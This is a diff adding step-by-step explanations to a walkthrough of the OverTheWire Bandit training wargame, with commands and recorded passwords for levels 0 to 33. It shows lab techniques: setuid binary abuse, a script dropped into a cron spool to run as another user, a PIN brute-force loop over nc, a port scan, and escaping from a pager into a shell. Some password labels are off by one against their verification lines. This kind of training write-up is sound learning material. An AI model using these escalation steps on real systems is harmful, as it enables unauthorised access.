@@ -22,6 +22,10 @@ the key/credential to this client machine and connecting directly to the public 
   ssh bandit0@bandit.labs.overthewire.org -p 2220
   cat ~/readme
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Log in as the first account.** `ssh bandit0@bandit.labs.overthewire.org -p 2220` (the password is `bandit0`, given by the game).
+2. **Look at the home directory.** `ls -la` shows a single readable file, `readme`, owned by `bandit1:bandit0`.
+3. **Read it.** `cat readme` prints the next password. Nothing to exploit: the file is handed to this level's account.
 - **Password for bandit1:** `6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR`
 - **Verification:** logged in as `bandit1` with this password (`whoami` → `bandit1`).
 - **Recording:** `recordings/bandit/L0.cast`
@@ -35,6 +39,10 @@ the key/credential to this client machine and connecting directly to the public 
   ls -la          # shows the file named "-"
   cat ./-
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **List the directory.** `ls -la` reveals a file whose name is exactly `-`; the permissions line shows it is readable by `bandit1`'s group.
+2. **Notice why the obvious command fails.** `cat -` would read *standard input*, because `-` is an option-like argument that GNU tools interpret specially. The `ls` output makes that trap visible.
+3. **Give the shell an unambiguous path.** `cat ./-` forces the argument to be a path (it starts with `./`), so `cat` opens the file instead of stdin. (`cat -- -` works the same way: `--` ends option parsing.)
 - **Password for bandit2:** `PK8fYLZg2hnHSz83plBL1iEPKdD3QToB`
 - **Verification:** logged in as `bandit2` with this password.
 - **Recording:** `recordings/bandit/L1.cast`
@@ -48,6 +56,10 @@ the key/credential to this client machine and connecting directly to the public 
   ls -la
   cat ./--spaces\ in\ this\ filename--
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **List the directory.** `ls -la` shows the file `--spaces in this filename--`. Two traps are visible: the name starts with `--`, and it contains spaces.
+2. **Keep it one argument.** Unquoted spaces split into separate words, so the shell would pass `cat` four arguments. Backslash-escaping each space keeps it one word: `cat ./--spaces\ in\ this\ filename--`.
+3. **Neutralise the leading dashes.** The `./` prefix (or `--` before the name) stops the string being read as an option.
 - **Password for bandit3:** `7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME`
 - **Verification:** logged in as `bandit3` with this password.
 - **Recording:** `recordings/bandit/L2.cast`
@@ -61,6 +73,10 @@ the key/credential to this client machine and connecting directly to the public 
   ls -la inhere/
   cat inhere/...Hiding-From-You
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Look in the directory.** `ls -la inhere/` lists every entry, including hidden ones. Plain `ls` would not show the dot-file.
+2. **Spot the hidden file.** The listing shows `...Hiding-From-You`, a name built from dots so it blends into the `.` and `..` entries at a glance.
+3. **Read it by its exact path.** `cat inhere/...Hiding-From-You` prints the password.
 - **Password for bandit4:** `xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq`
 - **Verification:** logged in as `bandit4` with this password.
 - **Recording:** `recordings/bandit/L3.cast`
@@ -74,6 +90,10 @@ the key/credential to this client machine and connecting directly to the public 
   file inhere/* 2>/dev/null
   cat inhere/-file07
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Inspect every candidate's type.** `file inhere/* 2>/dev/null` reports nine files as binary `data` and exactly one as `ASCII text`.
+2. **Read the text one.** The hit is `inhere/-file07`; the leading dash is harmless here because the argument is a path (`inhere/-file07`), not a bare `-file07`.
+3. **`cat inhere/-file07`** prints the password.
 - **Password for bandit5:** `6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG`
 - **Verification:** logged in as `bandit5` with this password.
 - **Recording:** `recordings/bandit/L4.cast`
@@ -87,6 +107,10 @@ the key/credential to this client machine and connecting directly to the public 
   find inhere -type f -size 1033c ! -executable
   cat inhere/maybehere07/.file2
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Express the three conditions as `find` predicates.** Size is `-size 1033c` (bytes), type is `-type f`, and "not executable" is `! -executable`.
+2. **Run them together.** `find inhere -type f -size 1033c ! -executable` returns exactly one path, `inhere/maybehere07/.file2`.
+3. **Read it.** `cat inhere/maybehere07/.file2` prints the password.
 - **Password for bandit6:** `pXa26xhMWaC2SvDotA4r9EgZkulOeSBW`
 - **Verification:** logged in as `bandit6` with this password.
 - **Recording:** `recordings/bandit/L5.cast`
@@ -100,6 +124,10 @@ the key/credential to this client machine and connecting directly to the public 
   find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
   cat /var/lib/dpkg/info/bandit7.password
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Search the whole filesystem.** `find / -user bandit7 -group bandit6 -size 33c 2>/dev/null` — the predicates are exact owner, exact group and exact byte size.
+2. **Silence the noise.** `2>/dev/null` drops the "Permission denied" errors from directories bandit6 cannot read, so the output is a single path: `/var/lib/dpkg/info/bandit7.password`.
+3. **Read it.** `cat /var/lib/dpkg/info/bandit7.password` prints the password.
 - **Password for bandit7:** `Bmnnvf82KzQlfxgAI2d1zYbr1u9pr3E3`
 - **Verification:** logged in as `bandit7` with this password.
 - **Recording:** `recordings/bandit/L6.cast`
@@ -112,6 +140,9 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   grep millionth data.txt
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Search the data file for the marker word.** `grep millionth data.txt` prints the whole matching line.
+2. **Read the value.** The file is `word<TAB>password`, so the password follows the tab on the same line.
 - **Password for bandit8:** `VR1ljMayciFxbnUokuQmJFw6QC9VKtub`
 - **Verification:** logged in as `bandit8` with this password.
 - **Recording:** `recordings/bandit/L7.cast`
@@ -124,6 +155,9 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   sort data.txt | uniq -u
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Sort first.** `uniq` only collapses *adjacent* duplicates, so `sort data.txt` groups equal lines together.
+2. **Print only unique lines.** `sort data.txt | uniq -u` keeps the single line that occurs exactly once — the password.
 - **Password for bandit9:** `EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl`
 - **Verification:** logged in as `bandit9` with this password.
 - **Recording:** `recordings/bandit/L8.cast`
@@ -136,6 +170,10 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   strings data.txt | grep "==="
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Check the file type.** `file data.txt` reports binary data, so `cat` would be unreadable.
+2. **Pull printable strings.** `strings data.txt` extracts printable runs.
+3. **Filter for the marker.** `strings data.txt | grep "==="` keeps the lines that start with `=`; the last one carries the password.
 - **Password for bandit10:** `B0s2khmbT9u0geKuOoVGW3JZKhndE3BG`
 - **Verification:** logged in as `bandit10` with this password.
 - **Recording:** `recordings/bandit/L9.cast`
@@ -148,6 +186,9 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   base64 -d data.txt
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Recognise the encoding.** `cat data.txt` shows text ending in `=`, the base64 padding character.
+2. **Decode it.** `base64 -d data.txt` converts the ASCII alphabet back to the original bytes, which read `The password is <pw>`.
 - **Password for bandit11:** `pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro`
 - **Verification:** logged in as `bandit11` with this password.
 - **Recording:** `recordings/bandit/L10.cast`
@@ -160,6 +201,9 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the data.** `cat data.txt` shows the ciphertext.
+2. **Apply ROT13.** `cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'` maps `A-Z` to `N-ZA-M` and `a-z` to `n-za-m`; because the shift is 13, applying it to the ciphertext returns the plaintext.
 - **Password for bandit12:** `GROozWPO8QyN0mGrjUkID0WCYkZiQxrN`
 - **Verification:** logged in as `bandit12` with this password.
 - **Recording:** `recordings/bandit/L11.cast`
@@ -181,6 +225,13 @@ the key/credential to this client machine and connecting directly to the public 
   tar -xf d7.tar && file -b data8.bin
   mv data8.bin d8.gz && gzip -dc d8.gz
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Work in a writable directory.** The home directory is read-only for this account, so the session creates `/tmp/b12live` and works there (`mkdir -p /tmp/b12live && cd /tmp/b12live`).
+2. **Undo the hexdump.** `xxd -r ~/data.txt > d1.bin` turns the hexdump back into bytes.
+3. **Identify the first layer.** `mv d1.bin d1.gz && gzip -dc d1.gz > d2.bin && file -b d2.bin` — the rename matters because the tools key off content, but `file` tells us what we have next.
+4. **Peel layer by layer.** `mv d2.bin d2.bz2 && bzip2 -dc d2.bz2 > d3.bin`, then `mv d3.bin d3.gz && gzip -dc d3.gz > d4.tar`, then `tar -xf d4.tar && tar -tf data5.bin` shows the next archive.
+5. **Keep going.** `tar -xf data5.bin && file -b data6.bin` → `mv data6.bin d6.bz2 && bzip2 -dc d6.bz2 > d7.tar && tar -tf d7.tar` → `tar -xf d7.tar && file -b data8.bin` → `mv data8.bin d8.gz && gzip -dc d8.gz` prints the plaintext password.
+6. **Note the pattern.** Each step is *identify with `file`*, *rename to the real type*, *decompress*. The chain is gzip → bzip2 → gzip → tar → tar → bzip2 → tar → gzip.
 - **Password for bandit13:** `qQYQiHOBPR8zR61qxYqX45quvihF2uzk`
 - **Verification:** logged in as `bandit13` with this password.
 - **Recording:** `recordings/bandit/L12.cast`
@@ -197,6 +248,10 @@ the key/credential to this client machine and connecting directly to the public 
   ssh -i key bandit14@bandit.labs.overthewire.org -p 2220 'cat /etc/bandit_pass/bandit14'
   ```
   (Inside bandit13, `cat HINT` and `cat sshkey.private` confirm the intended route; the localhost hop is rejected with "Connecting from/to localhost is blocked".)
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Inspect the key.** The home directory holds `sshkey.private`; `head -1` on the fetched copy shows `-----BEGIN OPENSSH PRIVATE KEY-----`.
+2. **Fetch it to this client.** OTW's backend refuses connections from `localhost`, so the key is read over the authenticated session: `ssh bandit13@... -p 2220 "cat sshkey.private" > key` (mode 600, or ssh refuses to use it).
+3. **Use it against the public host.** `ssh -i key bandit14@bandit.labs.overthewire.org -p 2220 "cat /etc/bandit_pass/bandit14"` — public-key auth proves possession of the identity whose public half is in bandit14's `authorized_keys`.
 - **Password for bandit14:** `aaWecNkG4FhxJQxz07uiwzVP6bJiYS65`
 - **Verification:** logged in as `bandit14` with this password.
 - **Recording:** `recordings/bandit/L13.cast`
@@ -209,6 +264,9 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   echo aaWecNkG4FhxJQxz07uiwzVP6bJiYS65 | nc -q 2 localhost 30000
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Connect and send the password.** `echo aaWecNkG4FhxJQxz07uiwzVP6bJiYS65 | nc -q 2 localhost 30000` — the daemon reads one line and compares it with bandit14's password.
+2. **Why `-q 2`.** When stdin ends, `nc` would close immediately; `-q 2` keeps the socket open for two more seconds so the daemon's reply can be read.
 - **Password for bandit15:** `pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7`
 - **Verification:** logged in as `bandit15` with this password.
 - **Recording:** `recordings/bandit/L14.cast`
@@ -221,6 +279,10 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   echo pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7 | openssl s_client -connect localhost:30001 -quiet 2>/dev/null
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Try the same idea as level 14.** A plain `nc` to port 30001 fails: the daemon expects a TLS handshake first.
+2. **Speak TLS.** `echo pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7 | openssl s_client -connect localhost:30001 -quiet 2>/dev/null` performs the handshake and writes the password over the encrypted channel.
+3. **Why `-quiet` and `2>/dev/null`.** `-quiet` suppresses the certificate chatter; redirecting stderr drops the remaining handshake diagnostics so the transcript shows only the daemon's reply.
 - **Password for bandit16:** `kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V`
 - **Verification:** logged in as `bandit16` with this password.
 - **Recording:** `recordings/bandit/L15.cast`
@@ -236,6 +298,11 @@ the key/credential to this client machine and connecting directly to the public 
   # save the returned key, chmod 600, then:
   ssh -i key bandit17@bandit.labs.overthewire.org -p 2220 'cat /etc/bandit_pass/bandit17'
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Scan the port range.** `nmap -p 31000-32000 localhost` (run as bandit16) lists 31046, 31518, 31691, 31790 and 31960.
+2. **Probe the candidates.** Several are decoy echo services that return the input unchanged; the real service is TLS on 31790.
+3. **Submit there.** `echo <bandit16 pw> | openssl s_client -connect localhost:31790 -quiet` answers `Correct!` followed by a PEM private key.
+4. **Use the key.** Save it (mode 600) and `ssh -i key bandit17@bandit.labs.overthewire.org -p 2220 "cat /etc/bandit_pass/bandit17"` — the localhost hop is blocked by OTW, so the key is used from this client.
 - **Password for bandit17:** `pWXMAZoxGC8JmDMfmT5MGEsobMM3vnj2`
 - **Verification:** logged in as `bandit17` with this password (and the returned key authenticated as bandit17 before that).
 - **Recording:** `recordings/bandit/L16.cast`
@@ -248,6 +315,9 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   diff passwords.old passwords.new
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Compare the two files.** `diff passwords.old passwords.new` prints only the differing lines.
+2. **Read the hunk.** The single change is `42c42`, with the old value on the `<` side and the new one on the `>` side — the new value is bandit18's password.
 - **Password for bandit18:** `OQxXZjELndr90zuhOTDYBEomI0SZITXI`
 - **Verification:** logged in as `bandit18` with this password.
 - **Recording:** `recordings/bandit/L17.cast`
@@ -260,6 +330,9 @@ the key/credential to this client machine and connecting directly to the public 
   ```
   ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Observe the symptom.** An interactive login dies immediately: bandit18's shell startup (`.bashrc`) logs the session out before it can accept input.
+2. **Run a command non-interactively.** `ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"` makes ssh execute the command directly and return its output, never starting the interactive shell that would exit.
 - **Password for bandit19:** `KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI`
 - **Verification:** logged in as `bandit19` with this password.
 - **Recording:** `recordings/bandit/L18.cast`
@@ -273,6 +346,10 @@ the key/credential to this client machine and connecting directly to the public 
   ls -la                 # shows -rwsr-x--- 1 bandit20 bandit19 bandit20-do
   ./bandit20-do cat /etc/bandit_pass/bandit20
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **List the directory.** `ls -la` shows `bandit20-do` with mode `-rwsr-x---` and owner `bandit20` — a setuid binary.
+2. **Check what it does.** It execs the command given as its arguments with bandit20's effective UID.
+3. **Use it.** `./bandit20-do cat /etc/bandit_pass/bandit20` reads the `0400 bandit20` password file because the `cat` it runs is bandit20.
 - **Password for bandit20:** `4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA`
 - **Verification:** logged in as `bandit20` with this password.
 - **Recording:** `recordings/bandit/L19.cast`
@@ -287,6 +364,11 @@ the key/credential to this client machine and connecting directly to the public 
   sleep 1
   ./suconnect 4000
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **List the directory.** `ls -la` shows `suconnect`, setuid bandit21.
+2. **Understand the protocol.** `suconnect <port>` connects to a TCP port on localhost, sends bandit20's password, and — if it matches — sends back bandit21's password.
+3. **Start the listener.** `(echo 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA; sleep 3) | nc -l -p 4000 &` listens on port 4000 and feeds the password on stdin.
+4. **Connect the binary.** `sleep 1` gives the listener time to bind, then `./suconnect 4000` performs the exchange. The `sleep 3` in the pipeline is what keeps stdin open long enough for suconnect to read the reply.
 - **Password for bandit21:** `bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY`
 - **Verification:** logged in as `bandit21` with this password.
 - **Recording:** `recordings/bandit/L20.cast`
@@ -301,6 +383,10 @@ the key/credential to this client machine and connecting directly to the public 
   cat /usr/bin/cronjob_bandit22.sh
   cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Find the cron job.** `cat /etc/cron.d/cronjob_bandit22` shows it runs every minute as bandit22.
+2. **Read the script.** `cat /usr/bin/cronjob_bandit22.sh` shows it `chmod 644`s a fixed file in `/tmp` and copies `/etc/bandit_pass/bandit22` into it.
+3. **Read the copy.** `cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` prints the password — the script can read it as bandit22, and the `chmod 644` makes the copy readable by us.
 - **Password for bandit22:** `RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz`
 - **Verification:** logged in as `bandit22` with this password.
 - **Recording:** `recordings/bandit/L21.cast`
@@ -316,6 +402,11 @@ the key/credential to this client machine and connecting directly to the public 
   echo I am user bandit23 | md5sum | cut -d ' ' -f 1     # 8ca319486bfbbc3663ea0fbe81326349
   cat /tmp/8ca319486bfbbc3663ea0fbe81326349
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Find the cron job.** `cat /etc/cron.d/cronjob_bandit23` points at `/usr/bin/cronjob_bandit23.sh`.
+2. **Read the script.** `cat /usr/bin/cronjob_bandit23.sh` computes `myname=$(whoami)` (which is `bandit23` under cron) and `mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)`, then writes `/etc/bandit_pass/$myname` to `/tmp/$mytarget`.
+3. **Reproduce the name.** `echo I am user bandit23 | md5sum | cut -d ' ' -f 1` gives the same MD5, so the output path is predictable.
+4. **Read it.** `cat /tmp/8ca319486bfbbc3663ea0fbe81326349` prints the password.
 - **Password for bandit23:** `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`
 - **Verification:** logged in as `bandit23` with this password.
 - **Recording:** `recordings/bandit/L22.cast`
@@ -334,6 +425,13 @@ the key/credential to this client machine and connecting directly to the public 
   # wait for the next cron minute, then:
   cat /tmp/b23out
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Find the cron job.** `cat /etc/cron.d/cronjob_bandit24` → `/usr/bin/cronjob_bandit24.sh`.
+2. **Read the script.** It iterates `/var/spool/bandit24/foo`, checks each file is owned by `bandit23` and is a regular file, and runs it with `timeout -s 9 60 ./file` **as bandit24**.
+3. **Check the directory.** `ls -ld /var/spool/bandit24/foo` shows `drwxrwx-wx` group `bandit24`: we can create files but not list them.
+4. **Drop the payload.** `echo 'cat /etc/bandit_pass/bandit24 > /tmp/b23out; chmod 644 /tmp/b23out' > /var/spool/bandit24/foo/grab.sh` writes a script that reads the password and copies it to a world-readable file.
+5. **Make it executable.** `chmod +x /var/spool/bandit24/foo/grab.sh` — the cron job invokes the file directly, so the execute bit matters.
+6. **Wait for cron.** It fires every minute; after ~70 s, `cat /tmp/b23out` prints the password.
 - **Password for bandit24:** `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`
 - **Verification:** logged in as `bandit24` with this password.
 - **Recording:** `recordings/bandit/L23.cast`
@@ -348,6 +446,12 @@ the key/credential to this client machine and connecting directly to the public 
   for i in $(seq -w 0 9999); do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done \
     | nc -q 2 localhost 30002 | grep -v Wrong
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Understand the protocol.** The daemon on port 30002 wants bandit24's password plus a 4-digit PIN on one line.
+2. **Test one attempt.** `echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000 | nc -q 2 localhost 30002` shows the rejection message.
+3. **Generate the whole space.** `for i in $(seq -w 0 9999); do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done` builds 10,000 candidate lines (`seq -w` zero-pads).
+4. **Send them in one connection.** Pipe that loop into `nc -q 2 localhost 30002`; the daemon reads one line per attempt.
+5. **Drop the failures.** `| grep -v Wrong` leaves the greeting and the success line with the password.
 - **Password for bandit25:** `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`
 - **Verification:** logged in as `bandit25` with this password.
 - **Recording:** `recordings/bandit/L24.cast`
@@ -365,6 +469,11 @@ the key/credential to this client machine and connecting directly to the public 
   :shell
   ./bandit27-do cat /etc/bandit_pass/bandit27
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Inspect the account.** The home holds `bandit26.sshkey`, but bandit26's login shell is `/usr/bin/showtext`, which runs `exec more ~/text.txt` and exits.
+2. **Find the escape.** `more` lets you press `v` to open the file in `vi`; in `vi`, `:set shell=/bin/bash` then `:shell` starts bash as bandit26.
+3. **Force pagination.** `~/text.txt` is only 6 lines, so on a normal terminal `more` prints it and exits before you can press `v`. Running the session on a 60x5 PTY (as the recording does) forces the `--More--` prompt to appear.
+4. **Use the key.** From this client, `ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220` (the localhost hop is blocked), then `./bandit27-do cat /etc/bandit_pass/bandit27` with the setuid binary.
 - **Password for bandit27:** `STJLJBRRphMxKB392CT4iOr5CbzPU9ER`
 - **Verification:** logged in as `bandit27` with this password.
 - **Recording:** `recordings/bandit/L25.cast`
@@ -379,6 +488,9 @@ the key/credential to this client machine and connecting directly to the public 
   cat repo/README
   ```
   (The recording shows the same clone, with `GIT_SSH_COMMAND` forcing password auth and `SSH_ASKPASS` supplying `STJLJBRRphMxKB392CT4iOr5CbzPU9ER`.)
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Clone the repository.** `git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo` — git's SSH transport, authenticated with bandit27's password via `SSH_ASKPASS`.
+2. **Read the README.** `cat repo/README` states the next password in plain text.
 - **Password for bandit27:** `y8Yd2ssKcpHpud7UvOSOxwamRMzIGIeQ`
 - **Verification:** logged in as `bandit28` with this password.
 - **Recording:** `recordings/bandit/L26.cast`
@@ -395,6 +507,10 @@ the key/credential to this client machine and connecting directly to the public 
   git --no-pager log --oneline
   git --no-pager show HEAD~1:README.md
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Clone and read.** `git clone ...` then `cat README.md` shows the password redacted as `xxxxxxxxxx`, and the commit is titled "fix info leak".
+2. **Look at history.** `git --no-pager log --oneline` shows the commits; the redaction is in HEAD only.
+3. **Print the parent version.** `git --no-pager show HEAD~1:README.md` prints the previous file, which still contains the real password. Removing a secret from the working tree does not remove it from history.
 - **Password for bandit28:** `Em7eGtqaMySwNFjCpwzzHhLhospOcdt0`
 - **Verification:** logged in as `bandit29` with this password.
 - **Recording:** `recordings/bandit/L27.cast`
@@ -411,6 +527,10 @@ the key/credential to this client machine and connecting directly to the public 
   git --no-pager branch -a
   git --no-pager show origin/dev:README.md
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Clone and read.** `git clone ...` then `cat README.md` says `<no passwords in production!>` on `master`.
+2. **List all refs.** `git --no-pager branch -a` shows a remote `dev` branch.
+3. **Read that branch's file.** `git --no-pager show origin/dev:README.md` prints the password — it was committed on a branch that was never merged.
 - **Password for bandit29:** `jq9Dfg2rXsfYsWMgFuKlXhphjdH7USgX`
 - **Verification:** logged in as `bandit30` with this password.
 - **Recording:** `recordings/bandit/L28.cast`
@@ -427,6 +547,10 @@ the key/credential to this client machine and connecting directly to the public 
   git --no-pager tag
   git --no-pager show secret
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Clone and read.** `cat README.md` is a decoy ("just an epmty file... muahaha").
+2. **List tags.** `git --no-pager tag` shows a tag named `secret`.
+3. **Show the tag.** `git --no-pager show secret` prints its content — tags are refs that can carry their own objects and messages.
 - **Password for bandit30:** `82NkymblpGBYmIXG6ZQ8YldBYstHpfUf`
 - **Verification:** logged in as `bandit31` with this password.
 - **Recording:** `recordings/bandit/L29.cast`
@@ -444,6 +568,12 @@ the key/credential to this client machine and connecting directly to the public 
   git commit -m 'key'
   git push origin master        # hook prints the password
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Clone and read the task.** `cat README.md; cat .gitignore` — the README asks for `key.txt` containing `May I come in?`, and `.gitignore` contains `*.txt`.
+2. **Create the file.** `echo "May I come in?" > key.txt`.
+3. **Defeat the ignore rule.** `git add -f key.txt` (plain `git add` would silently skip it).
+4. **Commit and push.** `git commit -m "key"` then `git push origin master`.
+5. **Read the hook output.** The remote pre-receive hook rejects the push but validates the content and prints the password for bandit31 in its `remote:` lines.
 - **Password for bandit31:** `pWuj5jBQ6IgV0NXwiH6g1pXRF8S1YvbT`
 - **Verification:** logged in as `bandit32` with this password (the account presents the uppercase-only shell).
 - **Recording:** `recordings/bandit/L30.cast`
@@ -458,6 +588,10 @@ the key/credential to this client machine and connecting directly to the public 
   id                            # uid=bandit33 — we are running as the next level's user
   cat /etc/bandit_pass/bandit33
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Observe the shell.** bandit32's login shell prints "WELCOME TO THE UPPERCASE SHELL" and uppercases every command before executing it.
+2. **Find a case-free command.** `$0` contains no letters, so uppercasing leaves it unchanged; in a POSIX shell `$0` expands to the shell's own name, so it re-executes the shell.
+3. **Use the new shell.** The re-executed shell is a normal shell inheriting bandit32's identity; `id` shows the account, and `cat /etc/bandit_pass/bandit33` prints the final password.
 - **Password for bandit32:** `u4P2CyPOwPGLe94RdD9Uo2FxFwvnFswM`
 - **Verification:** logged in as `bandit33` with this password; `~/README.txt` confirms it is the last level and `getent passwd bandit34` returns nothing.
 - **Recording:** `recordings/bandit/L31.cast`
@@ -472,6 +606,9 @@ the key/credential to this client machine and connecting directly to the public 
   cat ~/README.txt
   getent passwd bandit34 || echo "no bandit34"
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the end marker.** `cat ~/README.txt` says "Congratulations on solving the last level of this game! At this moment, there are no more levels to play."
+2. **Confirm there is no next account.** `getent passwd bandit34 || echo "no bandit34"` prints `no bandit34`, so the game ends at bandit33.
 - **Password for bandit34:** none — the game ends at bandit33.
 - **Verification:** login as bandit33 succeeds; the README states the game is complete; no bandit34 user exists on the host.
 - **Recording:** `recordings/bandit/L32.cast`
